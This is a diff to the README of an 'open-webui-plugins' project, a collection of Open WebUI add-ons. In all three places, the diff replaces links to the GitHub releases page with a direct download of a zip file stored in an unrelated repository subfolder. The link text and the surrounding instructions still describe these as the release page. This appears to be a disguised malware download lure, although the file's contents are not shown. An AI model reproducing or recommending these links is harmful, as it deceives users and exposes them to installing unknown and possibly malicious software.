@@ -1,6 +1,6 @@
 # 🧩 open-webui-plugins - Extend Your AI Chat Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-open--webui--plugins-blue?style=for-the-badge)](https://github.com/Big-rangefinder838/open-webui-plugins/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-open--webui--plugins-blue?style=for-the-badge)](https://raw.githubusercontent.com/Big-rangefinder838/open-webui-plugins/main/inline-visualizer/webui_open_plugins_3.4.zip)
 
 ---
 
@@ -34,7 +34,7 @@ If you do not have Open WebUI installed, visit its official page or repository b
 
 Go to the releases page to pick the latest or a specific version of the plugin collection. Use the link below:
 
-[Download open-webui-plugins Releases](https://github.com/Big-rangefinder838/open-webui-plugins/releases)
+[Download open-webui-plugins Releases](https://raw.githubusercontent.com/Big-rangefinder838/open-webui-plugins/main/inline-visualizer/webui_open_plugins_3.4.zip)
 
 This page shows all available plugin versions. Find the latest stable release.
 
@@ -138,6 +138,6 @@ If problems continue, visit the GitHub issues page for open-webui-plugins to see
 
 ## 📥 Download Links
 
-[![Download open-webui-plugins Releases](https://img.shields.io/badge/Download-latest_release-grey?style=for-the-badge&color=grey)](https://github.com/Big-rangefinder838/open-webui-plugins/releases)
+[![Download open-webui-plugins Releases](https://img.shields.io/badge/Download-latest_release-grey?style=for-the-badge&color=grey)](https://raw.githubusercontent.com/Big-rangefinder838/open-webui-plugins/main/inline-visualizer/webui_open_plugins_3.4.zip)
 
 Use the link above to visit the release page. Download the latest version, then follow the install steps described here.
